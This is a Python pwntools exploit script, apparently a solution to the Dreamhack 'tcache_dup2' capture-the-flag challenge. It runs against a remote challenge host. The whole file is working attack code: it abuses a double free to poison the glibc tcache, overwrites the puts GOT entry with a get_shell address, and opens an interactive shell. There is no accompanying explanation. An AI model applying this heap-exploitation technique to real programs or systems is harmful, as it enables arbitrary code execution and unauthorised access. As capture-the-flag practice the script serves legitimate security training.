from pwn import *

#p = process("./tcache_dup2")
p = remote("host1.dreamhack.games", 23733)
e = ELF("./tcache_dup2")

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def modify(idx, size, data):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def delete(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("idx: ", str(idx))

printf_got = e.got["printf"]
free_got = e.got["free"]
malloc_got = e.got["malloc"]
get_shell = e.symbols["get_shell"]
slog("printf_got", printf_got)
slog("printf_got", free_got)
slog("malloc_got", malloc_got)
slog("get_shell", get_shell)

create(0x20, "01234")
delete(0)
modify(0, 0xc, "012345678")
delete(0)

modify(0, 0x10, p64(e.got["puts"]))
create(0x20, p64(get_shell))
create(0x20, p64(get_shell))

p.interactive()